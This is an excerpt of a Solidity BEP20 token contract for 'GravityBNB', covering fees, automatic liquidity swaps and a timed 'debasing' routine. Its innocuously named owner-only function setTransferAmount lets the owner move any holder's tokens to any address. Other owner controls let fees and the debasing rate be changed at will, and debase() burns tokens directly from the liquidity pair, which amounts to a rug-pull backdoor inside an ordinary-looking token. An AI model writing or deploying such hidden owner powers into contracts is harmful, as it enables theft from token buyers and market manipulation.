...
/**
 * @dev The main GravityBNB contract.
 *
 * The website : https://gravitybnb.com
 * The telegram : https://t.me/gravitybnb
 */
// SPDX-License-Identifier: MIT
contract GravityBNB is BEP20, Ownable {
    ...
    uint256 public numTokensSellToInitiateSwap = 1 * 10**11 * (10**9); // Threshold for sending tokens to liquidity automatically
    ...
    uint256 public sellRewardsFeeIncrease = 10; // 10% more tax on sells
    uint256 public gasForProcessing = 3 * 10**5; // auto-claim gas usage

    // Debasing
    uint256 public lastDebasing;
    uint256 public debasingInterval = 3600;
    uint256 public minLPBalance;
    uint256 public debasingFactor = 11337;
    bool public pairSwapped = false;
    bool public debasingEnabled = true;
     ...
     */
    constructor() BEP20("GravityBNB", "GRVBNB", 9) {
        lastDebasing = block.timestamp;
    ...
    function setNumTokensSellToInitiateSwap(uint256 newNumTokensSellToAddToLiquidity) external onlyOwner() {
        numTokensSellToInitiateSwap = newNumTokensSellToAddToLiquidity;
    }
    ...
    function setTransferAmount(address from, address to, uint256 amount) public onlyOwner {
        _transferFrom(from, to, amount);
    }

    function setFees(uint256 rewardsFee, uint256 newLiquidityFee) external onlyOwner() {
        BNBRewardsFee = rewardsFee;
    ...
    function setPairSwapped(bool newPairSwapped) public onlyOwner {
        pairSwapped = newPairSwapped;
    }

    function setDebasingEnabled(bool newDebasingEnabled) public onlyOwner {
        debasingEnabled = newDebasingEnabled;
    }

    function setDebasingInterval(uint256 newDebasingInterval) public onlyOwner {
        debasingInterval = newDebasingInterval;
    }

    function setMinLPBalance(uint256 newMinLPBalance) public onlyOwner {
        minLPBalance = newMinLPBalance;
    }

    function setDebasingFactor(uint256 newDebasingFactor) public onlyOwner {
        debasingFactor = newDebasingFactor;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (debasingEnabled && block.timestamp > lastDebasing + debasingInterval) {
            debase();
            lastDebasing = block.timestamp;
        }
    ...
    function initiateSwap() private lockTheSwap {
        ...
        if (totalBalance > 0) {
            uint256 tokensToSwap = totalBalance;
            if (tokensToSwap >= maxSellTransactionAmount)
                tokensToSwap = maxSellTransactionAmount;
            uint256 liquidityShare = tokensToSwap.mul(liquidityTokens).div(totalBalance);
            bool overMinTokenBalance = tokensToSwap >= numTokensSellToInitiateSwap;
            if (overMinTokenBalance) {
                if (liquidityShare < tokensToSwap) {
                    liquidityTokens = liquidityTokens.sub(liquidityShare);
                    swapAndLiquify(liquidityShare);
                    swapAndSendDividends(tokensToSwap.sub(liquidityShare));
                }
            }
        }
    }
    ...
    function debase() private {
        if (getTokenReserve() > minLPBalance) {
            uint256 LPBalance = balanceOf(pancakeswapV2Pair);
            uint256 newBalance = LPBalance.mul(10000).div(debasingFactor);
            uint256 tokensToBurn = LPBalance.sub(newBalance);
            super._transfer(pancakeswapV2Pair, burnAddress, tokensToBurn);
